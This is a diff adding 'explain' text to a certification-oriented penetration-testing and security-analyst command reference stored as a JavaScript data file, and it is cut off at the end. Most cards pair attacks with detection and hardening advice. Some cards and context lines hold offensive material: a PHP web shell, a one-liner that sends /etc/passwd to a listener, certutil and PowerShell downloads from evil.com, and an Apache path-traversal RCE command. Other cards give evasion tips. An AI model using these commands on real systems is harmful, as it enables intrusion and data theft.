@@ -82878,7 +83118,8 @@ const COMMAND_DATA = {
         "upx",
         "file",
         "ssdeep"
-      ]
+      ],
+      "explain": "Identifies a sample's true file type without running it:\n  file <sample>.exe   inspect the header/magic bytes and report the format (an MZ header = a Windows PE)\nConfirms what you are dealing with before deeper static analysis; follow with md5sum/sha256sum, imphash, ssdeep, strings/FLOSS, and 'upx -d' to unpack UPX-packed samples."
     },
     {
       "id": "cdsa-m10-static-analysis-windows",
@@ -82978,7 +83219,8 @@ const COMMAND_DATA = {
         "floss",
         "upx",
         "ssdeep"
-      ]
+      ],
+      "explain": "Fingerprints a malware sample by cryptographic hash on Windows:\n  Get-FileHash            PowerShell hashing cmdlet\n  -Algorithm SHA256       the digest to compute\n  C:\\Samples\\...\\Ransomware.wannacry.exe   the sample\nGives a hash to check against threat-intel/VirusTotal; the card continues with imphash, ssdeep, pestudio section analysis, strings/FLOSS, and CFF Explorer for UPX detection."
     },
     {
       "id": "cdsa-m11-js-encoding",
@@ -83075,7 +83317,8 @@ const COMMAND_DATA = {
         "tr",
         "curl",
         "python3"
-      ]
+      ],
+      "explain": "Decodes a Base64 string, e.g. one pulled from obfuscated JavaScript:\n  echo '<blob>'   feed the encoded text\n  base64 -d       decode it back to the original bytes\nRecovers the hidden value (URL, command, key); tell the encoding by shape - '=' padding = Base64, 0-9a-f pairs = hex ('xxd -p -r'), shifted letters = ROT13 ('tr A-Za-z N-ZA-Mn-za-m')."
     },
     {
       "type": "command",
@@ -83200,7 +83443,8 @@ const COMMAND_DATA = {
           "command": "amass enum -active -brute -d <domain> -w <wordlist>",
           "label": "amass (active brute)"
         }
-      ]
+      ],
+      "explain": "Brute-forces subdomains by resolving a wordlist against the domain with dnsenum:\n  --enum <domain>   enumeration mode against this domain\n  -f <wordlist>     candidate subdomain names to try\n  -r                recurse into subdomains it discovers\nResolves each guess and reports the ones that exist; amass, subfinder, and puredns cover the same ground with different data sources."
     },
     {
       "type": "command",
@@ -83966,7 +84210,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "Suricata rule anatomy and content modifiers for writing custom rules."
         }
-      ]
+      ],
+      "explain": "Validates a Suricata configuration before deploying it:\n  suricata -T            test/self-check mode (do not process traffic)\n  -c /etc/suricata/suricata.yaml   the config to validate\nConfirms the config and rules parse cleanly so a reload will not break the sensor; the card also covers suricata-update for rules, a SIGUSR2 live reload, and file extraction (file-store)."
     },
     {
       "id": "cdsa-m09-suricata-rule-syntax",
@@ -84180,7 +84425,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Installing Sysmon with default flags only (-i -accepteula) without a configuration XML generates high-volume unfiltered events that overwhelm SIEM storage and make analysis impractical. Not including -h md5,sha256,imphash misses hash-based detection (cannot compare against threat intel IOCs). Not enabling -n misses network connection telemetry (cannot correlate C2 connections to processes). Not forwarding to SIEM = telemetry exists only on the endpoint and is lost if host is compromised or reimaged.",
         "vulnerable_config": "# Minimal install - no config, no hash, no network:\nsysmon.exe -i -accepteula\n# Problems:\n# - No file hashes in Event ID 1 (cannot match against malware IOCs)\n# - No network connections logged (cannot find C2 beaconing)\n# - No image load logging (cannot detect DLL injection)\n# - High noise from all events with no filtering\n# - Sysmon events not forwarded to SIEM\n\n# Missing critical config sections:\n# - No NetworkConnect rules (Event ID 3 disabled)\n# - No ImageLoad rules (Event ID 7 disabled)\n# - No CreateRemoteThread rules (Event ID 8 disabled)\n# - No RawAccessRead rules (Event ID 9 disabled)",
         "secure_config": "# Full install with hashing, image load, and network logging:\nsysmon.exe -i -accepteula -h md5,sha256,imphash -l -n\n#   -h md5,sha256,imphash  = hash all executables (MD5 for compat, SHA256 for IOC matching, ImpHash for malware family)\n#   -l                     = log all loaded images (DLL injection detection via Event ID 7)\n#   -n                     = log all network connections (Event ID 3)\n\n# Apply community config (recommended - suppresses noise, focuses on malicious patterns):\nsysmon.exe -i sysmonconfig-export.xml\n# Source: https://github.com/SwiftOnSecurity/sysmon-config\n\n# Verify installation:\nGet-Service Sysmon | Select Status  # Should show Running\nGet-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 5 | Select Id,Message\n\n# Forward events via WEF subscription:\n# In GPO: Windows Settings > Security Settings > Event Log > Event Forwarding\n# Subscribe to: Microsoft-Windows-Sysmon/Operational\n\n# Alert on Sysmon service stop (SIEM rule):\n# Source: System log, Event ID 7036\n# Message contains: Sysmon service entered the stopped state"
-      }
+      },
+      "explain": "Installs Sysmon to capture deep Windows telemetry:\n  -i            install the service and driver\n  -accepteula   accept the license non-interactively\n  -h md5,sha256,imphash   record these hash types for created/loaded images\n  -l            log module (image) loads\n  -n            log network connections\nStarts high-fidelity logging to the Sysmon/Operational channel; for real use install with a curated config ('-i sysmonconfig-export.xml') and update it later with '-c'."
     },
     {
       "id": "cdsa-sysmon-event-ids",
@@ -84274,7 +84520,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "LSASS dump detection using Sysmon Event 10."
         }
-      ]
+      ],
+      "explain": "Reads a specific Sysmon event type by ID using a Get-WinEvent XPath filter:\n  -LogName 'Microsoft-Windows-Sysmon/Operational'   the Sysmon channel\n  -FilterXPath \"*[System[EventID=<ID>]]\"            select one event ID (1=process, 3=network, 7=image load, 10=process access, ...)\nLets you pull the event class that maps to a technique you are hunting; combine several IDs with -FilterHashtable @{...; ID=1,3,7,10} to correlate across event types."
     },
     {
       "id": "ad-sysvol-scripts",
@@ -84362,7 +84609,8 @@ const COMMAND_DATA = {
           "label": "Grep logon scripts for creds",
           "command": "findstr /S /I /C:\"password\" \\\\<dc_host>\\SYSVOL\\<domain>\\scripts\\*"
         }
-      ]
+      ],
+      "explain": "Lists the domain logon-script folder in SYSVOL:\n  ls \\\\<dc_host>\\SYSVOL\\<domain>\\scripts   browse the replicated scripts share (readable by all domain users)\nLogon scripts (.bat/.vbs/.ps1) frequently hardcode credentials for drive mapping or privileged tasks; recurse SYSVOL and Select-String for 'password'/'net use', or reach it with smbclient."
     },
     {
       "id": "crtp-targeted-kerberoasting",
@@ -84799,7 +85047,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "TShark and Wireshark - GUI-based and CLI alternatives with display filters."
         }
-      ]
+      ],
+      "explain": "Captures on an interface but keeps only packets matching a BPF filter:\n  sudo tcpdump   packet sniffer (needs root)\n  -i eth0        the interface to capture on\n  host <target_ip>   BPF primitive: only traffic to/from this host\nCuts the noise down to the conversation you care about; combine primitives with and/or/not (e.g. 'host X and port 23'), and read a saved pcap with -r instead of -i for non-destructive post-capture filtering."
     },
     {
       "id": "cdsa-m07-tcpdump-fundamentals",
@@ -84877,7 +85126,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "BPF filters for tcpdump - host, port, protocol, and logical operators."
         }
-      ]
+      ],
+      "explain": "Captures traffic and prints full packet detail with tcpdump:\n  -i eth0   capture on this interface\n  -nn       do not resolve hostnames or port names (raw IPs/ports)\n  -v        verbose protocol decoding\n  -XX       show packet contents in hex and ASCII, including link-layer headers\nGives you the full byte-level view for inspection; add -w file.pcap to save, -r file.pcap to read back, and -c N to stop after N packets."
     },
     {
       "id": "crtp-double-hop",
@@ -85589,7 +85839,8 @@ const COMMAND_DATA = {
           "OWASP A05:2021"
         ],
         "evasion": "Undeploy the malicious WAR after getting a shell; name it innocuously; manager access over a valid session looks like admin activity."
-      }
+      },
+      "explain": "Detects Apache Tomcat and its version:\n  curl -s http://<url>:8080/docs/   fetch the docs page\n  | grep Tomcat                     read the version string\nConfirms Tomcat; then brute-force paths with gobuster for /manager and /host-manager (WAR deployment endpoints) and look for tomcat-users.xml, which often holds the manager credentials."
     },
     {
       "type": "payload",
@@ -86315,7 +86566,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Fetches a file using a scripting interpreter when wget/curl are missing or blocked:\n  python3 -c '...'   run an inline Python program\n  urllib.request.urlretrieve(<url>,\"out\")   download <url> and save it as out\nGives you the file on a hardened host; php, ruby, perl, and cscript variants do the same when python is absent."
     },
     {
       "type": "command",
@@ -86415,7 +86667,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'",
         "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
-      }
+      },
+      "explain": "Pushes a local file out to your listener with an inline interpreter one-liner:\n  requests.post(\"http://<ip>:8000/upload\", ...)   POST to a Python uploadserver\n  files={\"files\":open(\"/etc/passwd\",\"rb\")}          attach the file as multipart form data\nLands the file on your box; pair it with a running uploadserver, or use the urlopen variant to just read a served file back."
     },
     {
       "id": "tshark-pcap-creds",
@@ -86619,7 +86872,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "Wireshark advanced: FTP dissection, Follow Stream, HTTP object export, RDP decryption."
         }
-      ]
+      ],
+      "explain": "Captures live traffic to a file with TShark (Wireshark's CLI):\n  tshark          same capture engine as Wireshark, no GUI\n  -i eth0         interface to capture on\n  -w /tmp/capture.pcap   write raw packets to this file\nSaves a capture you can later open in Wireshark or filter with -Y (display filter); use -f for a BPF capture filter and -a duration:/filesize: to bound the capture."
     },
     {
       "id": "cdsa-m08-tunneling-detection",
@@ -87220,7 +87474,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services",
         "evasion": "Prefer encrypted/HTTPS callbacks, migrate out of the initial process quickly, and avoid signatured default payloads."
-      }
+      },
+      "explain": "Upgrades a dumb reverse shell into a fully interactive TTY:\n  python -c 'import pty; pty.spawn(\"/bin/bash\")'   spawn a proper pseudo-terminal\nThen background with Ctrl+Z, run 'stty raw -echo; fg' locally and 'export TERM=xterm-256color' to get tab-completion, job control, arrow keys, and working editors/su - essential before serious post-exploitation."
     },
     {
       "id": "upload-blacklist-bypass",
@@ -88590,7 +88845,8 @@ const COMMAND_DATA = {
           "label": "Validate against the DC (no lockout)",
           "command": "kerbrute userenum -d <domain> --dc <dc_ip> usernames.txt -o valid_users.txt"
         }
-      ]
+      ],
+      "explain": "Builds an AD username wordlist from real names:\n  username-anarchy   permutation generator\n  -i <names_file>    input list of 'First Last' names (from OSINT/LinkedIn)\n  | tee ...txt       save the generated candidates\nProduces common formats (first.last, flast, f.last, firstl, ...); feed the output straight into kerbrute userenum to confirm which actually exist before spraying."
     },
     {
       "id": "veil-payload-gen",
@@ -88778,7 +89034,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target side: unpatched publicly known CVEs. Exploit-DB has a published working exploit = vulnerability is public knowledge. No virtual patching (IPS rule) while awaiting vendor patch.",
         "vulnerable_config": "# Unpatched service with public exploit:\n# searchsploit apache 2.4.49\n# → CVE-2021-41773: Path Traversal and RCE (Exploit-DB 50383)\n# curl 'http://target/cgi-bin/.%2e/.%2e/bin/sh' -d 'echo Content-Type: text/plain; echo; id'\n# → Code execution\n\n# No IPS rule for known CVE patterns",
         "secure_config": "# Patch management:\n# 1. Monitor vendor security advisories + CVE feeds (NVD, vendor mailing lists)\n# 2. Patch critical CVEs within 72 hours\n# 3. Interim: virtual patch via IPS while testing\n\n# Snort rule for CVE-2021-41773:\n# alert tcp any any -> $HTTP_SERVERS 80 (msg:'Apache Path Traversal CVE-2021-41773';\n#   content:'/.%2e/'; http_uri; sid:9002;)\n\n# Network segmentation: Apache servers not directly internet-accessible\n# WAF: ModSecurity with CRS blocks path traversal patterns"
-      }
+      },
+      "explain": "Reads a public exploit end-to-end before running it:\n  searchsploit -x <edb-id>   render the full source so you can review it\nPoCs are untrusted code - confirm it targets your exact product/version/architecture, understand what it does, and strip any hostile payload or hard-coded callback; 'searchsploit -m' copies it locally, and regenerate shellcode with msfvenom rather than trusting the author's."
     },
     {
       "type": "reference",
@@ -88958,7 +89215,8 @@ const COMMAND_DATA = {
           "label": "Combined - threads + ignore SSL + save",
           "command": "gobuster vhost -u https://<ip> -w <wordlist> --append-domain -t 50 -k -o vhosts.txt"
         }
-      ]
+      ],
+      "explain": "Brute-forces the HTTP Host header to find virtual hosts served from one IP:\n  gobuster vhost   virtual-host discovery mode\n  -u http://<ip>   the target IP/base URL\n  -w <wordlist>    host names to try in the Host header\n  --append-domain  append the base domain to each word (word.domain)\nDifferent Host values can serve entirely different sites; add -k for HTTPS with invalid certs and -o to save hits."
     },
     {
       "type": "command",
@@ -89063,7 +89321,8 @@ const COMMAND_DATA = {
           "command": "vnstat",
           "label": "vnstat"
         }
-      ]
+      ],
+      "explain": "Watches live network throughput on an interface while you scan:\n  vnstat -l        live mode (real-time rx/tx rates)\n  -i eth0          the interface to monitor\nLets you see if an aggressive Nessus/OpenVAS scan is saturating the link or likely to trip network monitoring; 'vnstat -d' gives a daily summary instead."
     },
     {
       "id": "gs-vpn-connect",
@@ -89165,7 +89424,8 @@ const COMMAND_DATA = {
       ],
       "primary_cert": "CPTS",
       "source": "CPTS Module 02: Getting Started",
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "Connects your attack VM to the lab network over OpenVPN:\n  sudo openvpn user.ovpn   bring up the VPN using this config profile (root needed to create the tun interface)\nEstablishes the tunnel (watch for 'Initialization Sequence Completed'); then confirm tun0 exists with 'ip -4 a show tun0' and that the lab subnet is routed before touching any target."
     },
     {
       "type": "command",
@@ -89471,7 +89731,8 @@ const COMMAND_DATA = {
         "detection",
         "recon",
         "web"
-      ]
+      ],
+      "explain": "Detects and fingerprints a Web Application Firewall by probing it and analysing responses:\n  wafw00f <url>   send crafted requests to the target and match the WAF signature\nTells you the WAF vendor so you can pick the right evasion technique before attacking; add -a to test all signatures and -v for detail."
     },
     {
       "type": "command",
@@ -90528,7 +90789,8 @@ const COMMAND_DATA = {
           "command": "cat results.json | jq .",
           "label": "View JSON results"
         }
-      ]
+      ],
+      "explain": "ReconSpider crawls a site and extracts interesting artifacts into results.json:\n  python3 ReconSpider.py http://<domain>   start crawling from this URL\nHarvests emails, links, JS files, forms, and comments so you can map the app and spot sensitive endpoints; read the output with 'cat results.json | jq .'."
     },
     {
       "type": "command",
@@ -90643,7 +90905,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Web application and infrastructure information is inadvertently exposed: verbose HTTP headers (Server, X-Powered-By) revealing exact version numbers, directory listing enabled on web servers, .git repositories or .env files accessible in the web root, robots.txt listing sensitive paths, and WHOIS data exposing internal contact details.",
         "vulnerable_config": "# Apache with version disclosure in headers:\n# HTTP response: Server: Apache/2.4.41 (Ubuntu)\n# X-Powered-By: PHP/7.4.3  <-- exact version, enables targeted exploit search\n\n# Directory listing enabled:\n# nginx: autoindex on;  <- any directory without index.html lists files\n# Apache: Options +Indexes\n\n# .git accessible from web root:\n# http://target.com/.git/config  -- exposes repo + credentials in config\n# http://target.com/.env  -- exposes DB_PASSWORD, API keys",
         "secure_config": "# Apache - remove version disclosure:\n# /etc/apache2/conf-enabled/security.conf:\nServerTokens Prod          # shows only 'Apache' not version\nServerSignature Off        # removes version from error pages\n\n# nginx:\nserver_tokens off;         # hides nginx version\n\n# Disable directory listing:\n# Apache: Options -Indexes\n# nginx: remove 'autoindex on' from all location blocks\n\n# Block sensitive files/directories:\n# Apache:\n<DirectoryMatch '(\\.git|\\.env|\\.svn|backup|config)'>\n    Require all denied\n</DirectoryMatch>\n\n# nginx:\nlocation ~* /(\\.git|\\.env|\\.svn|backup\\/) { deny all; return 404; }\n\n# Remove X-Powered-By header:\n# PHP: expose_php = Off (php.ini)"
-      }
+      },
+      "explain": "Identifies the web stack from HTTP response headers:\n  curl -I https://<domain>   send a HEAD request and print only the response headers\nServer, X-Powered-By, and cookie headers reveal the technology and sometimes the version; follow up with wafw00f for WAF detection and nikto for misconfigurations."
     },
     {
       "id": "fuzzer-flags-ref",
@@ -90836,7 +91099,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "OWASP A01:2021"
         ]
-      }
+      },
+      "explain": "Exploits mass assignment by adding parameters the form never exposed:\n  username=<user>&password=<pass>&confirmed=true   the extra 'confirmed=true' binds to a model field the UI hides\nFrameworks that auto-bind all request params to model attributes let you set privileged fields (confirmed=true, admin=true) to self-approve or escalate; diff the object's JSON keys (jq 'keys') to discover bindable fields to inject."
     },
     {
       "id": "web-proxy-scanner",
@@ -91371,7 +91635,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "Fingerprints a web server from its HTTP headers:\n  curl   HTTP client\n  -I     fetch headers only (HEAD)\n  -L     follow redirects\n  https://<host>   the target\nServer/X-Powered-By headers reveal the tech stack; always also read robots.txt and page source for hidden paths, and run whatweb for a fuller fingerprint."
     },
     {
       "type": "payload",
@@ -91470,7 +91735,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Outbound connections from servers are not filtered - any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
         "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows - PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
         "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows - PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
-      }
+      },
+      "explain": "A one-line web shell that runs OS commands from a URL parameter:\n  <?php system($_REQUEST[\"cmd\"]); ?>   execute whatever is passed as the 'cmd' parameter\nDrop it into the webroot (echo it to shell.php), then hit /shell.php?cmd=id to run commands as the web-server user; pick the language matching the app (PHP/JSP/ASP)."
     },
     {
       "type": "command",
@@ -91580,7 +91846,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Hosts a WebDAV share over HTTP, useful where SMB (445) is blocked outbound:\n  wsgidav --host=0.0.0.0 --port=80   listen on all interfaces, port 80\n  --root=/tmp                        serve this directory\n  --auth=anonymous                   allow unauthenticated access\nWindows reaches it via the \\\\<ip>\\DavWWWRoot\\ UNC path, so copy/dir work over WebDAV like a normal share."
     },
     {
       "id": "wenum-wfuzz-fuzzing",
@@ -91803,7 +92070,8 @@ const COMMAND_DATA = {
           "command": "whois <ip> -h <whois_server>",
           "label": "whois an IP (pick server)"
         }
-      ]
+      ],
+      "explain": "Queries WHOIS registration data for a domain:\n  whois <domain>   look up the domain's registry record\nReturns registrar, registrant, name servers, and creation/expiry dates - a passive first look that can leak org names, emails, and infrastructure; add -h <server> to query a specific WHOIS server."
     },
     {
       "type": "command",
@@ -92003,7 +92271,8 @@ const COMMAND_DATA = {
           "label": "Computers",
           "command": "python3 windapsearch.py --dc-ip <dc_ip> -u <user>@<domain> -p <password> -C"
         }
-      ]
+      ],
+      "explain": "Runs common LDAP queries against a DC with windapsearch:\n  --dc-ip <dc_ip>        the DC to query\n  -u <user>@<domain> -p <password>   authenticate\n  --da                   enumerate Domain Admins group members\nA friendlier front-end to ldapsearch for frequent tasks; swap --da for -U (all users) or --PU (privileged users), and it also supports anonymous binds."
     },
     {
       "id": "reg-save-hives",
@@ -92547,7 +92816,8 @@ const COMMAND_DATA = {
           "PEN-200 Ch 6",
           "MS Docs"
         ]
-      }
+      },
+      "explain": "Installs the Telnet client on a Windows foothold via DISM:\n  dism /online   operate on the running OS\n  /Enable-Feature /FeatureName:TelnetClient   turn on the optional Telnet client feature\nGives you telnet for banner grabbing and manual protocol interaction (e.g. SMTP VRFY) when it is not installed; needs local admin, and /Get-Features confirms the state."
     },
     {
       "id": "cmdkey-list",
@@ -92763,7 +93033,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Downloads a file over FTP with PowerShell's WebClient:\n  New-Object Net.WebClient      create the download client\n  .DownloadFile('ftp://<ip>/file.txt','C:\\...\\ftp-file.txt')   fetch the FTP URL, save locally\nSaves the file to disk; for a constrained cmd shell, script the built-in ftp.exe non-interactively with 'ftp -v -n -s:ftpcommand.txt'."
     },
     {
       "id": "net-view-shares",
@@ -92866,7 +93137,8 @@ const COMMAND_DATA = {
           "MITRE T1135",
           "MS Docs"
         ]
-      }
+      },
+      "explain": "Lists shared resources on a remote host with the built-in net view:\n  net view \\\\<ip>   query the host's shares\n  /all             include hidden admin shares (ADMIN$, C$, IPC$)\nA no-tools way from an authenticated Windows session to see what a host shares; 'net view' alone lists computers in the domain."
     },
     {
       "id": "netsh-portproxy",
@@ -92979,7 +93251,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy - direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
